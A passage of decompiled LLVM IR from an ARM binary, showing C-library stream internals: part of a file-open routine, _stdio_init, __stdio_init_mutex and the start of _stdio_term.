  store i32 %v0_13010, i32* @r6, align 4
  %v0_13014 = load i32, i32* @r2, align 4
  store i32 %v0_13014, i32* @sb, align 4
  %v0_13018 = load i32, i32* @r3, align 4
  store i32 %v0_13018, i32* @r5, align 4
  br i1 %v7_13004, label %dec_label_pc_13064, label %dec_label_pc_13020

dec_label_pc_13020:                               ; preds = %entry
  %v7_13020 = icmp eq i8 %v2_12ffc, 119
  br i1 %v7_13020, label %bb, label %dec_label_pc_1302c

bb:                                               ; preds = %dec_label_pc_13020
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_13068

dec_label_pc_1302c:                               ; preds = %dec_label_pc_13020
  %v7_1302c = icmp eq i8 %v2_12ffc, 97
  br i1 %v7_1302c, label %bb34, label %dec_label_pc_13038

bb34:                                             ; preds = %dec_label_pc_1302c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_13068

dec_label_pc_13038:                               ; preds = %dec_label_pc_1302c, %dec_label_pc_130ec, %dec_label_pc_130c0
  %v0_13038 = call i32 @__GI___errno_location()
  store i32 %v0_13038, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_13040 = load i32, i32* @sb, align 4
  %v2_13040 = icmp eq i32 %v0_13040, 0
  %v2_13044 = inttoptr i32 %v0_13038 to i32*
  store i32 22, i32* %v2_13044, align 4
  br i1 %v2_13040, label %dec_label_pc_132b8, label %dec_label_pc_1304c

dec_label_pc_1304c:                               ; preds = %dec_label_pc_13110._crit_edge, %dec_label_pc_13038
  %v0_1304c = load i32, i32* @sb, align 4
  %v1_1304c = inttoptr i32 %v0_1304c to i16*
  %v2_1304c = load i16, i16* %v1_1304c, align 2
  %v3_1304c = zext i16 %v2_1304c to i32
  store i32 %v3_1304c, i32* %r3.global-to-local, align 4
  %v1_13050 = and i32 %v3_1304c, 8192
  %v2_13050 = icmp eq i32 %v1_13050, 0
  br i1 %v2_13050, label %dec_label_pc_132b8, label %dec_label_pc_13058

dec_label_pc_13058:                               ; preds = %dec_label_pc_1304c
  store i32 %v0_1304c, i32* @r0, align 4
  %v0_1305c = call i32 @free()
  store i32 %v0_1305c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_132b8

dec_label_pc_13064:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13068

dec_label_pc_13068:                               ; preds = %bb, %bb34, %dec_label_pc_13064
  %v1_13080 = phi i32 [ 1089, %bb34 ], [ 577, %bb ], [ 1, %dec_label_pc_13064 ]
  %v1_13068 = add i32 %v0_12ffc, 1
  %v2_13068 = inttoptr i32 %v1_13068 to i8*
  %v3_13068 = load i8, i8* %v2_13068, align 1
  %v7_1306c = icmp eq i8 %v3_13068, 98
  %v1_13068.v0_12ffc = select i1 %v7_1306c, i32 %v1_13068, i32 %v0_12ffc
  store i32 %v1_13068.v0_12ffc, i32* %r3.global-to-local, align 4
  %v1_13078 = add i32 %v1_13068.v0_12ffc, 1
  %v2_13078 = inttoptr i32 %v1_13078 to i8*
  %v3_13078 = load i8, i8* %v2_13078, align 1
  %v4_13078 = zext i8 %v3_13078 to i32
  store i32 %v4_13078, i32* @r3, align 4
  %v7_1307c = icmp eq i8 %v3_13078, 43
  br i1 %v7_1307c, label %bb37, label %.thread5

bb37:                                             ; preds = %dec_label_pc_13068
  store i32 %v1_13080, i32* @r3, align 4
  %v2_13084 = add nuw nsw i32 %v1_13080, 1
  store i32 %v2_13084, i32* @r4, align 4
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_13068, %bb37
  %v2_13088 = icmp eq i32 %v0_13014, 0
  br i1 %v2_13088, label %dec_label_pc_13090, label %dec_label_pc_130b8

dec_label_pc_13090:                               ; preds = %.thread5
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_13094 = call i32 @malloc(i32 80)
  store i32 %v1_13094, i32* %r0.global-to-local, align 4
  store i32 %v1_13094, i32* @sb, align 4
  %v3_13098 = icmp eq i32 %v1_13094, 0
  br i1 %v3_13098, label %dec_label_pc_132bc, label %dec_label_pc_130a0

dec_label_pc_130a0:                               ; preds = %dec_label_pc_13090
  %v2_130a4 = add i32 %v1_13094, 8
  %v3_130a4 = inttoptr i32 %v2_130a4 to i32*
  store i32 0, i32* %v3_130a4, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_130ac = load i32, i32* @sb, align 4
  %v3_130ac = inttoptr i32 %v2_130ac to i16*
  store i16 8192, i16* %v3_130ac, align 2
  %v0_130b0 = load i32, i32* @sb, align 4
  %v1_130b0 = add i32 %v0_130b0, 56
  store i32 %v1_130b0, i32* @r0, align 4
  %v1_130b4 = call i32 @__stdio_init_mutex(i32 %v1_130b0)
  store i32 %v1_130b4, i32* %r0.global-to-local, align 4
  %v0_130b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_130b8

dec_label_pc_130b8:                               ; preds = %.thread5, %dec_label_pc_130a0
  %v0_13110 = phi i32 [ %v0_13018, %.thread5 ], [ %v0_130b8.pre, %dec_label_pc_130a0 ]
  %v1_130b8 = icmp slt i32 %v0_13110, 0
  br i1 %v1_130b8, label %dec_label_pc_13110, label %dec_label_pc_130c0

dec_label_pc_130c0:                               ; preds = %dec_label_pc_130b8
  %v0_130c4 = load i32, i32* @r4, align 4
  %v2_130c4 = and i32 %v0_130c4, ptrtoint (i32* @global_var_20003.833 to i32)
  %v1_130c8 = or i32 %v2_130c4, 1
  store i32 %v1_130c8, i32* %r2.global-to-local, align 4
  %v0_130cc = load i32, i32* @r6, align 4
  %v1_130cc = add i32 %v0_130cc, 1
  %v2_130d0 = and i32 %v1_130cc, %v1_130c8
  store i32 %v2_130d0, i32* %r3.global-to-local, align 4
  %v9_130d4 = icmp eq i32 %v2_130d0, %v1_130c8
  %v1_130d8 = load i32, i32* @sb, align 4
  %v2_130d8 = add i32 %v1_130d8, 4
  %v3_130d8 = inttoptr i32 %v2_130d8 to i32*
  store i32 %v0_13110, i32* %v3_130d8, align 4
  br i1 %v9_130d4, label %dec_label_pc_130e0, label %dec_label_pc_13038

dec_label_pc_130e0:                               ; preds = %dec_label_pc_130c0
  %v0_130e0 = load i32, i32* @r4, align 4
  %v1_130e0 = load i32, i32* @r6, align 4
  %v2_130e0 = sub i32 -1, %v1_130e0
  %v3_130e0 = and i32 %v0_130e0, %v2_130e0
  store i32 %v3_130e0, i32* @r3, align 4
  %v1_130e4 = and i32 %v3_130e0, 1024
  %v2_130e4 = icmp eq i32 %v1_130e4, 0
  br i1 %v2_130e4, label %dec_label_pc_13104, label %dec_label_pc_130ec

dec_label_pc_130ec:                               ; preds = %dec_label_pc_130e0
  %v0_130ec = load i32, i32* @r5, align 4
  store i32 %v0_130ec, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_130f8 = call i32 @__libc_fcntl(i32 %v0_130ec, i32 4)
  store i32 %v2_130f8, i32* %r0.global-to-local, align 4
  %v2_130fc = icmp eq i32 %v2_130f8, 0
  br i1 %v2_130fc, label %dec_label_pc_130ec.dec_label_pc_13104_crit_edge, label %dec_label_pc_13038

dec_label_pc_130ec.dec_label_pc_13104_crit_edge:  ; preds = %dec_label_pc_130ec
  %v0_13104.pre = load i32, i32* @r6, align 4
  %v0_13108.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13104

dec_label_pc_13104:                               ; preds = %dec_label_pc_130ec.dec_label_pc_13104_crit_edge, %dec_label_pc_130e0
  %v0_13108 = phi i32 [ %v0_13108.pre, %dec_label_pc_130ec.dec_label_pc_13104_crit_edge ], [ %v0_130e0, %dec_label_pc_130e0 ]
  %v0_13104 = phi i32 [ %v0_13104.pre, %dec_label_pc_130ec.dec_label_pc_13104_crit_edge ], [ %v1_130e0, %dec_label_pc_130e0 ]
  %v1_13104 = and i32 %v0_13104, 131072
  store i32 %v1_13104, i32* %r3.global-to-local, align 4
  %v2_13108 = or i32 %v1_13104, %v0_13108
  store i32 %v2_13108, i32* @r4, align 4
  br label %dec_label_pc_13134

dec_label_pc_13110:                               ; preds = %dec_label_pc_130b8
  %v7_13110 = icmp eq i32 %v0_13110, -1
  %v0_1311c.pre = load i32, i32* @r4, align 4
  br i1 %v7_13110, label %dec_label_pc_13110._crit_edge, label %bb38

bb38:                                             ; preds = %dec_label_pc_13110
  %v2_13114 = or i32 %v0_1311c.pre, ptrtoint (i32* @global_var_20000.834 to i32)
  store i32 %v2_13114, i32* @r4, align 4
  br label %dec_label_pc_13110._crit_edge

dec_label_pc_13110._crit_edge:                    ; preds = %dec_label_pc_13110, %bb38
  %v0_1311c = phi i32 [ %v2_13114, %bb38 ], [ %v0_1311c.pre, %dec_label_pc_13110 ]
  %v0_13118 = load i32, i32* @r6, align 4
  store i32 %v0_13118, i32* %r0.global-to-local, align 4
  store i32 %v0_1311c, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_13124 = call i32 @__GI_open(i32 %v0_13118, i32 %v0_1311c)
  store i32 %v2_13124, i32* %r0.global-to-local, align 4
  %v1_13128 = icmp slt i32 %v2_13124, 0
  %v1_1312c = load i32, i32* @sb, align 4
  %v2_1312c = add i32 %v1_1312c, 4
  %v3_1312c = inttoptr i32 %v2_1312c to i32*
  store i32 %v2_13124, i32* %v3_1312c, align 4
  br i1 %v1_13128, label %dec_label_pc_1304c, label %.dec_label_pc_13134_crit_edge

.dec_label_pc_13134_crit_edge:                    ; preds = %dec_label_pc_13110._crit_edge
  %v0_13138.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13134

dec_label_pc_13134:                               ; preds = %.dec_label_pc_13134_crit_edge, %dec_label_pc_13104
  %v0_13150 = phi i32 [ %v0_13138.pre, %.dec_label_pc_13134_crit_edge ], [ %v2_13108, %dec_label_pc_13104 ]
  %v0_13134 = load i32, i32* @sb, align 4
  %v1_13134 = inttoptr i32 %v0_13134 to i16*
  %v2_13134 = load i16, i16* %v1_13134, align 2
  %v3_13134 = zext i16 %v2_13134 to i32
  %v1_13138 = urem i32 %v0_13150, 4
  %v1_1313c = and i32 %v0_13150, 1024
  %v1_13140 = and i32 %v3_13134, 8192
  %v1_13144 = add nuw nsw i32 %v1_13138, 1
  %v2_13148 = or i32 %v1_13140, %v1_1313c
  store i32 %v2_13148, i32* %r3.global-to-local, align 4
  %v1_1314c = xor i32 %v1_13144, 3
  store i32 %v1_1314c, i32* %r1.global-to-local, align 4
  %v1_13150 = and i32 %v0_13150, ptrtoint (i32* @global_var_20000.834 to i32)
  store i32 %v1_13150, i32* %r2.global-to-local, align 4
  %v2_13150 = icmp eq i32 %v1_13150, 0
  %v1_13154 = add i32 %v0_13134, 4
  %v2_13154 = inttoptr i32 %v1_13154 to i32*
  %v3_13154 = load i32, i32* %v2_13154, align 4
  store i32 %v3_13154, i32* @r5, align 4
  br i1 %v2_13150, label %bb40, label %bb39

bb39:                                             ; preds = %dec_label_pc_13134
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_13134, %bb39
  %v0_13160 = phi i32 [ 0, %dec_label_pc_13134 ], [ 32768, %bb39 ]
  %v4_1315c = mul nuw nsw i32 %v1_1314c, 16
  %v5_1315c = or i32 %v2_13148, %v4_1315c
  store i32 %v5_1315c, i32* %r3.global-to-local, align 4
  %v2_13160 = or i32 %v0_13160, %v5_1315c
  store i32 %v2_13160, i32* %r2.global-to-local, align 4
  %v8_13164 = icmp eq i32 %v3_13154, 2147483647
  %v1_13168 = trunc i32 %v2_13160 to i16
  store i16 %v1_13168, i16* %v1_13134, align 2
  br i1 %v8_13164, label %dec_label_pc_13198, label %dec_label_pc_13170

dec_label_pc_13170:                               ; preds = %bb40
  %v0_13170 = call i32 @__GI___errno_location()
  store i32 %v0_13170, i32* @r4, align 4
  %v0_13178 = load i32, i32* @r5, align 4
  store i32 %v0_13178, i32* @r0, align 4
  %v1_1317c = inttoptr i32 %v0_13170 to i32*
  %v2_1317c = load i32, i32* %v1_1317c, align 4
  store i32 %v2_1317c, i32* @r5, align 4
  %v1_13180 = call i32 @isatty(i32 %v0_13178)
  store i32 %v1_13180, i32* %r0.global-to-local, align 4
  %v2_13184 = icmp eq i32 %v1_13180, 0
  br i1 %v2_13184, label %.thread7, label %bb41

bb41:                                             ; preds = %dec_label_pc_13170
  %v1_13188 = load i32, i32* @sb, align 4
  %v2_13188 = inttoptr i32 %v1_13188 to i16*
  %v3_13188 = load i16, i16* %v2_13188, align 2
  %v4_13188 = zext i16 %v3_13188 to i32
  %v2_1318c = or i32 %v4_13188, 256
  store i32 %v2_1318c, i32* %r3.global-to-local, align 4
  %v2_13190 = trunc i32 %v2_1318c to i16
  store i16 %v2_13190, i16* %v2_13188, align 2
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13170, %bb41
  %v0_13194 = load i32, i32* @r5, align 4
  %v1_13194 = load i32, i32* @r4, align 4
  %v2_13194 = inttoptr i32 %v1_13194 to i32*
  store i32 %v0_13194, i32* %v2_13194, align 4
  br label %dec_label_pc_13198

dec_label_pc_13198:                               ; preds = %bb40, %.thread7
  %v0_13198 = load i32, i32* @sb, align 4
  %v1_13198 = add i32 %v0_13198, 8
  %v2_13198 = inttoptr i32 %v1_13198 to i32*
  %v3_13198 = load i32, i32* %v2_13198, align 4
  store i32 %v3_13198, i32* %r3.global-to-local, align 4
  %v2_1319c = icmp eq i32 %v3_13198, 0
  br i1 %v2_1319c, label %dec_label_pc_131a4, label %bb42

dec_label_pc_131a4:                               ; preds = %dec_label_pc_13198
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_131a8 = call i32 @malloc(i32 4096)
  store i32 %v1_131a8, i32* %r0.global-to-local, align 4
  %v2_131ac = icmp eq i32 %v1_131a8, 0
  %v1_131bc.pre = load i32, i32* @sb, align 4
  br i1 %v2_131ac, label %.thread11, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_131a4
  %v2_131b0 = inttoptr i32 %v1_131bc.pre to i16*
  %v3_131b0 = load i16, i16* %v2_131b0, align 2
  %v4_131b0 = zext i16 %v3_131b0 to i32
  %v2_131b4 = add i32 %v1_131a8, 4096
  store i32 %v2_131b4, i32* %r2.global-to-local, align 4
  %v2_131b8 = or i32 %v4_131b0, 16384
  store i32 %v2_131b8, i32* %r3.global-to-local, align 4
  %v2_131bc = add i32 %v1_131bc.pre, 8
  %v3_131bc = inttoptr i32 %v2_131bc to i32*
  store i32 %v1_131a8, i32* %v3_131bc, align 4
  %v1_131c0 = load i32, i32* %r2.global-to-local, align 4
  %v2_131c0 = load i32, i32* @sb, align 4
  %v3_131c0 = add i32 %v2_131c0, 12
  %v4_131c0 = inttoptr i32 %v3_131c0 to i32*
  store i32 %v1_131c0, i32* %v4_131c0, align 4
  %v1_131c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_131c4 = trunc i32 %v1_131c4 to i16
  %v3_131c4 = load i32, i32* @sb, align 4
  %v4_131c4 = inttoptr i32 %v3_131c4 to i16*
  store i16 %v2_131c4, i16* %v4_131c4, align 2
  br label %bb42

.thread11:                                        ; preds = %dec_label_pc_131a4
  %v2_131bc21 = add i32 %v1_131bc.pre, 8
  %v3_131bc22 = inttoptr i32 %v2_131bc21 to i32*
  store i32 0, i32* %v3_131bc22, align 4
  %v2_131c8 = load i32, i32* @sb, align 4
  %v3_131c8 = add i32 %v2_131c8, 12
  %v4_131c8 = inttoptr i32 %v3_131c8 to i32*
  store i32 0, i32* %v4_131c8, align 4
  br label %bb42

bb42:                                             ; preds = %.thread10, %dec_label_pc_13198, %.thread11
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_131d4 = load i32, i32* @fp, align 4
  %v2_131d4 = add i32 %v0_131d4, 60
  %v3_131d4 = inttoptr i32 %v2_131d4 to i32*
  %v4_131d4 = load i32, i32* %v3_131d4, align 4
  store i32 %v4_131d4, i32* %r3.global-to-local, align 4
  %v2_131d8 = load i32, i32* @sb, align 4
  %v3_131d8 = add i32 %v2_131d8, 2
  %v4_131d8 = inttoptr i32 %v3_131d8 to i8*
  store i8 0, i8* %v4_131d8, align 1
  %v0_131dc = load i32, i32* @sb, align 4
  %v1_131dc = inttoptr i32 %v0_131dc to i16*
  %v2_131dc = load i16, i16* %v1_131dc, align 2
  %v3_131dc = zext i16 %v2_131dc to i32
  store i32 %v3_131dc, i32* %r2.global-to-local, align 4
  %v0_131e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_131e0 = inttoptr i32 %v0_131e0 to i32*
  %v2_131e0 = load i32, i32* %v1_131e0, align 4
  store i32 %v2_131e0, i32* %r1.global-to-local, align 4
  %v1_131e4 = add i32 %v0_131dc, 8
  %v2_131e4 = inttoptr i32 %v1_131e4 to i32*
  %v3_131e4 = load i32, i32* %v2_131e4, align 4
  store i32 %v3_131e4, i32* %r3.global-to-local, align 4
  %v1_131e8 = and i32 %v3_131dc, 8192
  %v2_131e8 = icmp eq i32 %v1_131e8, 0
  %v2_131ec = add i32 %v0_131dc, 20
  %v3_131ec = inttoptr i32 %v2_131ec to i32*
  store i32 %v3_131e4, i32* %v3_131ec, align 4
  %v0_131f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_131f0 = load i32, i32* @sb, align 4
  %v2_131f0 = add i32 %v1_131f0, 44
  %v3_131f0 = inttoptr i32 %v2_131f0 to i32*
  store i32 %v0_131f0, i32* %v3_131f0, align 4
  %v0_131f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_131f4 = load i32, i32* @sb, align 4
  %v2_131f4 = add i32 %v1_131f4, 52
  %v3_131f4 = inttoptr i32 %v2_131f4 to i32*
  store i32 %v0_131f4, i32* %v3_131f4, align 4
  %v0_131f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_131f8 = load i32, i32* @sb, align 4
  %v2_131f8 = add i32 %v1_131f8, 24
  %v3_131f8 = inttoptr i32 %v2_131f8 to i32*
  store i32 %v0_131f8, i32* %v3_131f8, align 4
  %v0_131fc = load i32, i32* %r3.global-to-local, align 4
  %v1_131fc = load i32, i32* @sb, align 4
  %v2_131fc = add i32 %v1_131fc, 28
  %v3_131fc = inttoptr i32 %v2_131fc to i32*
  store i32 %v0_131fc, i32* %v3_131fc, align 4
  %v0_13200 = load i32, i32* %r3.global-to-local, align 4
  %v1_13200 = load i32, i32* @sb, align 4
  %v2_13200 = add i32 %v1_13200, 16
  %v3_13200 = inttoptr i32 %v2_13200 to i32*
  store i32 %v0_13200, i32* %v3_13200, align 4
  br i1 %v2_131e8, label %dec_label_pc_132bc, label %dec_label_pc_13208

dec_label_pc_13208:                               ; preds = %bb42
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_1320c = load i32, i32* @fp, align 4
  %v2_1320c = add i32 %v0_1320c, 36
  %v3_1320c = inttoptr i32 %v2_1320c to i32*
  %v4_1320c = load i32, i32* %v3_1320c, align 4
  store i32 %v4_1320c, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_13214 = add i32 %v0_1320c, 112
  %v3_13214 = inttoptr i32 %v2_13214 to i32*
  %v4_13214 = load i32, i32* %v3_13214, align 4
  store i32 %v4_13214, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_1321c = ptrtoint i32* %stack_var_-56 to i32
  %v2_13220 = add i32 %v0_1320c, 76
  %v3_13220 = inttoptr i32 %v2_13220 to i32*
  %v4_13220 = load i32, i32* %v3_13220, align 4
  store i32 %v4_1320c, i32* %r1.global-to-local, align 4
  store i32 %v4_13214, i32* %r2.global-to-local, align 4
  store i32 %v2_1321c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13220)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1323c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1323c, i32* %r0.global-to-local, align 4
  %v0_13240 = load i32, i32* @fp, align 4
  %v2_13240 = add i32 %v0_13240, 16
  %v3_13240 = inttoptr i32 %v2_13240 to i32*
  %v4_13240 = load i32, i32* %v3_13240, align 4
  call void @__pseudo_branch(i32 %v4_13240)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_13250 = load i32, i32* @fp, align 4
  %v2_13250 = add i32 %v0_13250, 100
  %v3_13250 = inttoptr i32 %v2_13250 to i32*
  %v4_13250 = load i32, i32* %v3_13250, align 4
  store i32 %v4_13250, i32* %r4.global-to-local, align 4
  %v0_13254 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13254, i32* %r1.global-to-local, align 4
  store i32 %v4_13250, i32* %r2.global-to-local, align 4
  store i32 %v2_1300c, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13220)
  store i32 %v4_13250, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13240)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_13278 = load i32, i32* @fp, align 4
  %v2_13278 = add i32 %v0_13278, 48
  %v3_13278 = inttoptr i32 %v2_13278 to i32*
  %v4_13278 = load i32, i32* %v3_13278, align 4
  store i32 %v4_13278, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_13280 = inttoptr i32 %v4_13278 to i32*
  %v2_13280 = load i32, i32* %v1_13280, align 4
  store i32 %v2_13280, i32* %r2.global-to-local, align 4
  store i32 %v2_1300c, i32* %r0.global-to-local, align 4
  %v1_13288 = load i32, i32* @sb, align 4
  %v2_13288 = add i32 %v1_13288, 32
  %v3_13288 = inttoptr i32 %v2_13288 to i32*
  store i32 %v2_13280, i32* %v3_13288, align 4
  %v0_1328c = load i32, i32* @fp, align 4
  %v1_1328c = load i32, i32* %r3.global-to-local, align 4
  %v2_1328c = add i32 %v1_1328c, %v0_1328c
  %v3_1328c = inttoptr i32 %v2_1328c to i32*
  %v4_1328c = load i32, i32* %v3_1328c, align 4
  store i32 %v4_1328c, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_13294 = load i32, i32* @sb, align 4
  %v1_13294 = load i32, i32* @ip, align 4
  %v2_13294 = inttoptr i32 %v1_13294 to i32*
  store i32 %v0_13294, i32* %v2_13294, align 4
  call void @__pseudo_branch(i32 %v4_1328c)
  store i32 %v2_1321c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1328c)
  br label %dec_label_pc_132bc

dec_label_pc_132b8:                               ; preds = %dec_label_pc_1304c, %dec_label_pc_13038, %dec_label_pc_13058
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_132bc

dec_label_pc_132bc:                               ; preds = %bb42, %dec_label_pc_13090, %dec_label_pc_13208, %dec_label_pc_132b8
  %v0_132bc = load i32, i32* @sb, align 4
  store i32 %v0_132bc, i32* %r0.global-to-local, align 4
  %v2_132c4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_132c4, i32* @r4, align 4
  store i32 %v6_12ff8, i32* @r5, align 4
  store i32 %v9_12ff8, i32* @r6, align 4
  store i32 %v18_12ff8, i32* @sb, align 4
  store i32 %v24_12ff8, i32* @fp, align 4
  ret i32 %v0_132bc

; uselistorder directives
  uselistorder i32 %v1_131bc.pre, { 2, 1, 0 }
  uselistorder i32 %v0_13150, { 1, 2, 0 }
  uselistorder i32 %v0_1311c, { 1, 0 }
  uselistorder i32 %v1_130e0, { 1, 0 }
  uselistorder i32 %v0_130e0, { 1, 0 }
  uselistorder i32 %v1_130c8, { 1, 0, 2 }
  uselistorder i32 %v1_13080, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 4, 3, 5, 6, 7, 8, 10, 9, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_132bc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_132b8, { 2, 0, 1 }
  uselistorder label %bb42, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13198, { 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
  uselistorder label %dec_label_pc_13110._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_130b8, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %dec_label_pc_13068, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13038, { 1, 2, 0 }
}

define i32 @function_132d0(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_132d0:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_132d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_132d0, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_132d0
  %v3_132d8 = and i32 %arg4, %arg3
  %v2_132dc = trunc i32 %v3_132d8 to i16
  %v4_132dc = inttoptr i32 %v3_132d8 to i16*
  store i16 %v2_132dc, i16* %v4_132dc, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_132d0, %bb
  %v10_132fc = phi i32 [ %tmp, %dec_label_pc_132d0 ], [ 0, %bb ]
  ret i32 %v10_132fc

; uselistorder directives
  uselistorder i32 %v3_132d8, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @_stdio_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_13304 = call i32 @__GI___errno_location()
  store i32 %v0_13304, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_13310 = inttoptr i32 %v0_13304 to i32*
  %v2_13310 = load i32, i32* %v1_13310, align 4
  store i32 %v2_13310, i32* @r6, align 4
  %v1_13314 = call i32 @isatty(i32 0)
  %v2_1331c = icmp eq i32 %v1_13314, 0
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r4, align 4
  br i1 %v2_1331c, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_13328 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 772) to i16*), align 4
  %v7_13328 = zext i16 %v5_13328 to i32
  %v2_1332c = xor i32 %v7_13328, 256
  store i32 %v2_1332c, i32* @r3, align 4
  %v2_13330 = trunc i32 %v2_1332c to i16
  store i16 %v2_13330, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 772) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_13338 = call i32 @isatty(i32 1)
  %v2_1333c = icmp eq i32 %v1_13338, 0
  br i1 %v2_1333c, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_13344 = load i32, i32* @r4, align 4
  %v2_13348 = add i32 %v1_13344, 852
  %v3_13348 = inttoptr i32 %v2_13348 to i16*
  %v4_13348 = load i16, i16* %v3_13348, align 2
  %v2_1334c = xor i16 %v4_13348, 256
  store i16 %v2_1334c, i16* %v3_13348, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v0_13354 = load i32, i32* @r6, align 4
  %v1_13354 = load i32, i32* @r5, align 4
  %v2_13354 = inttoptr i32 %v1_13354 to i32*
  store i32 %v0_13354, i32* %v2_13354, align 4
  ret i32 %v1_13338

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -37100), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_13384 = call i32 @memcpy()
  ret i32 %v0_13384
}

define i32 @_stdio_term(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1339c = load i32, i32* @r4, align 4
  store i32 %v3_1339c, i32* %stack_var_-24, align 4
  store i32 100, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r6.global-to-local, align 4
  %v4_133ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 100) to i32*), align 4
  store i32 %v4_133ac, i32* @r0, align 4
  %v1_133b0 = call i32 @__stdio_init_mutex(i32 %v4_133ac)
  store i32 %v1_133b0, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_133b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 112) to i32*), align 4
  store i32 %v4_133b8, i32* @r0, align 4
  %v1_133bc = call i32 @__stdio_init_mutex(i32 %v4_133b8)
  store i32 %v1_133bc, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_133c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_133c4 = add i32 %v0_133c4, 48
  %v3_133c4 = inttoptr i32 %v2_133c4 to i32*
  %v4_133c4 = load i32, i32* %v3_133c4, align 4
  store i32 %v4_133c4, i32* %r3.global-to-local, align 4
